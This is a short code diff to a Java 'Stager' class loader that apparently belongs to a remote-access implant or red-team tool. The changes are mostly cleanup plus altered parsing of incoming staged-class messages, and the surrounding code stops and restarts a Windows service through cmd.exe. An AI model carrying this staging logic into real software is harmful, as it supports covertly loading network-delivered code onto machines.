@@ -177,11 +177,11 @@ public class Stager extends ClassLoader {
         URL classUrl = Stager.class.getProtectionDomain().getCodeSource().getLocation();
         File theJarFile = new File( classUrl.toURI() ); 
         
-        List<String> cleanupList = new ArrayList<String>();
+        List<String> cleanupList = new ArrayList<>();
         if( !serviceName.isEmpty() && System.getProperty( "os.name" ).toLowerCase().contains("windows")){
                     
             //Tell the service to stop and restart
-            final List<String> strList = new ArrayList<String>();
+            final List<String> strList = new ArrayList<>();
             strList.add("cmd.exe");
             strList.add("/c");
             strList.add("sc qc \"" + serviceName + "\"");
@@ -275,10 +275,10 @@ public class Stager extends ClassLoader {
         
         try {
             
-            //Prune of the unnecessary data
+            //Prune off the unnecessary data
             DataInputStream localDataInputStream = new DataInputStream(paramInputStream);
             byte msgType = (byte)(localDataInputStream.read() & 0xff );
-            if( msgType == 88 ){
+            if( msgType == 0 ){
 
                 //Skip the message length
                 byte[] msglenArr = new byte[4];
@@ -296,16 +296,16 @@ public class Stager extends ClassLoader {
                     localDataInputStream.skipBytes(4);
                     
                     //Get the classpath length
-                    byte[] clsLen = new byte[2];
-                    localDataInputStream.read(clsLen);
-                    
-                    //Convert to int
-                    int tempInt = 0;
-                    tempInt += (clsLen[0] & 0xff) << (8 * 1);
-                    tempInt += (clsLen[1] & 0xff);
-                    
-                    //Skip the classpath
-                    localDataInputStream.skipBytes(tempInt);
+//                    byte[] clsLen = new byte[2];
+//                    localDataInputStream.read(clsLen);
+//                    
+//                    //Convert to int
+//                    int tempInt = 0;
+//                    tempInt += (clsLen[0] & 0xff) << (8 * 1);
+//                    tempInt += (clsLen[1] & 0xff);
+//                    
+//                    //Skip the classpath
+//                    localDataInputStream.skipBytes(tempInt);
                     
                     //Get the type
                     msgType = (byte)(localDataInputStream.read() & 0xff );
